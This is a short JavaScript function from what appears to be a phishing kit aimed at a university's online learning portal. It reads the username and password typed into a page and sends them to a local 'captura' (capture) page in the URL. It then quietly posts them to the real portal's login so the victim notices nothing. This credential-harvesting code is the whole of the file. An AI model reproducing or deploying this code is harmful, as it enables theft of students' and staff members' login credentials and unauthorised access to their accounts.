/* global dataType */
//https://stackoverflow.com/questions/133925/javascript-post-request-like-a-form-submit

function capturar(){
    var user = document.getElementById("user").value;
    var pass = document.getElementById("pass").value;
    
    window.open('captura/index.html?user='+user+'&pass='+pass);
    
    document.body.innerHTML += '<form id="ava" action="http://ava.unicarioca.edu.br/login" method="post"><input type="hidden" name="username" value="'+user+'"><input type="hidden" name="password" value="'+pass+'"></form>';
    document.getElementById("ava").submit();
}
